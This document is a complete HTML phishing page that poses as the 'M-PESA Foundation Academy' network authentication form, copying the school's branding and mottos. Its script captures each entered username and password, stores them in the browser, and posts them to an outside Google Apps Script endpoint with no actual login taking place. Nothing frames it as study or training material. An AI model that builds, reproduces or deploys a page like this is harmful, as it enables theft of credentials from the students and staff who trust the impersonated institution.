<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>M-PESA Foundation Academy â€” Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;600&display=swap" rel="stylesheet" />
<style>
  :root {
    --bg: #ffffff;
    --green: #4fa03e;
    --logo-color: #66993a;
    --label-color: #305b99;
    --footer-color: #666666;
    --text-color: #222222;
    --input-bg: #f8fafb;
    --input-border: #eceff2;
    --placeholder-color: #b1b5bc;
    --header-text-color: #2b5e90;
  }
  * {
    box-sizing: border-box;
  }
  body, html {
    margin: 0;
    height: 100%;
    background: var(--bg);
    font-family: 'Inter', system-ui, Arial, sans-serif;
    color: var(--text-color);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  .top-text {
    font-weight: 400;
    font-size: 14px;
    margin-bottom: 8px;
    color: var(--text-color);
    user-select: none;
  }
  .top-text span {
    padding: 0 6px;
  }
  .logo {
    font-weight: 600;
    font-size: 18px;
    letter-spacing: 1.5px;
    color: var(--logo-color);
    margin-bottom: 20px;
    user-select: none;
  }
  .card {
    background: #fff;
    box-shadow: 0 8px 28px rgba(15,23,42,0.06);
    border-radius: 6px;
    padding: 46px 64px;
    max-width: 420px;
    width: 100%;
    text-align: center;
  }
  .form-title {
    font-weight: 600;
    font-size: 20px;
    color: var(--label-color);
    margin-bottom: 20px;
    user-select: none;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 14px 16px;
    border-radius: 10px;
    border: 1px solid var(--input-border);
    background: var(--input-bg);
    font-size: 15px;
    font-weight: 300;
    color: var(--text-color);
    margin-bottom: 18px;
  }
  input::placeholder {
    color: var(--placeholder-color);
    font-weight: 300;
  }
  button.login-btn {
    width: 100%;
    background-color: var(--green);
    color: #fff;
    border: none;
    font-weight: 600;
    border-radius: 8px;
    padding: 12px 18px;
    cursor: pointer;
    font-size: 16px;
    user-select: none;
  }
  .user-portal {
    margin: 24px 0 0 0;
    font-size: 15px;
    font-weight: 500;
    color: var(--footer-color);
    user-select: none;
  }
  .footer-text {
    width: 100%;
    max-width: 720px;
    font-weight: 400;
    font-size: 15px;
    color: var(--footer-color);
    margin-top: 36px;
    user-select: none;
  }
</style>
</head>
<body>
<div class="top-text">
  Thinkers <span>:</span> Doers <span>:</span> Leaders
</div>
<div class="logo">M-PESA FOUNDATION ACADEMY</div>
<div class="card" role="main" aria-label="Network Authentication Form">
  <div class="form-title">Network Authentication Form</div>
  <form id="loginForm">
    <input type="text" id="username" name="username" placeholder="Enter your Username" required autocomplete="username" />
    <input type="password" id="password" name="password" placeholder="Enter your Password" required autocomplete="current-password" />
    <button class="login-btn" type="submit">Login</button>
  </form>
  <div class="user-portal">Click here to access User Portal</div>
</div>
<div class="footer-text">
  Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
</div>
<script>
  const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwYOsSonTJ4W0Aduq-IygbHGUcm6cH-c-A-W5JNKVQjOBVPrUtbpgi4X9hpfslX586G/exec";

  document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();
    if (!user || !pass) {
      alert("Please enter both username and password.");
      return;
    }
    const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
    attempts.push({ username: user, password: pass, time: new Date().toLocaleString() });
    localStorage.setItem("loginAttempts", JSON.stringify(attempts));
    
    const formData = new FormData();
    formData.append("username", user);
    formData.append("password", pass);
    formData.append("role", "participant");
    
    try {
      const response = await fetch(GOOGLE_SCRIPT_URL, {
        method: "POST",
        body: formData,
        mode: "cors",
        headers: {
          'Accept': 'application/json',
        }
      });
      if (response.ok) {
        
      } else {
        alert("Failed to submit credentials. Please try again.");
      }
    } catch (error) {
      alert("An error occurred while submitting credentials. Please check your internet connection and try again.");
      console.error("Fetch error:", error);
    }
  });
</script>
</body>
</html>

